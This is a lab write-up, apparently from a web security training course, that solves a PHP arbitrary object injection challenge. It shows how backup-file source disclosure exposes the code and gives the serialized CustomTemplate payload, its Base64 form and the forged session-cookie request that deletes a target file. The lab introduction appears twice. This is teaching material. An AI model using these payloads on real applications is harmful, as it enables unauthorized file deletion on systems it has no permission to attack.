## Arbitrary object injection in PHP

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.

## Notes

- File Upload feature on user account
- PHP Object in cookie
- /login
- /libs/CustomTemplate.php

## Arbitrary object injection in PHP


This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious `CustomTemplate` object into the session cookie so that Carlos’s `morale.txt` file is deleted.


You can log in to your own account using the following credentials: `wiener:peter`

## Notes

- `/my-account`
- `/libs/CustomTemplate.php`
- Serialized PHP object in cookie

## Resume

1. Log in using your own credentials.
2. Open the post-login `GET /my-account` request in Burp.
3. Find the reference to `/libs/CustomTemplate.php`.
4. Read the source code by requesting `/libs/CustomTemplate.php~`.
5. Create a serialized `CustomTemplate` object with `lock_file_path` set to `/home/carlos/morale.txt`.
6. Base64-encode the object and URL-encode it.
7. Replace the session cookie with the malicious object.
8. Send the request and trigger the file deletion.

## Solve

Log in to your own account and notice that the session cookie contains a serialized PHP object.

On `/my-account?id=wiener`, you should see this HTML comment:

```html
</div>
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
</div>
```

From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select **Send to Repeater**.

In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.

The source code shows that the `CustomTemplate` class contains the `__destruct()` magic method, which calls `unlink()` on the `lock_file_path` attribute. That means if you control `lock_file_path`, you can make the object delete an arbitrary file when it is destroyed.

The relevant source code is:

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators.

The final serialized object should look like this:

```http
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Base64-encode and URL-encode this object, then save it to your clipboard.

The Base64-encoded value is:


```http
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

Send a request containing the session cookie to Burp Repeater.

The original request looks like this:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a7e007f03caaf92801d12d8000a00a3.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvbmV4cGJsdHgxNjIwY2F4ampqY2syYzJta2wwcTJiOSI7fQ%3d%3d
```

Replace the session cookie with the modified one from your clipboard:

```http
GET /my-account?id=wiener HTTP/2
Host: 0a7e007f03caaf92801d12d8000a00a3.web-security-academy.net
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

Send the request. The `__destruct()` method is automatically invoked and deletes Carlos’s file, which solves the lab.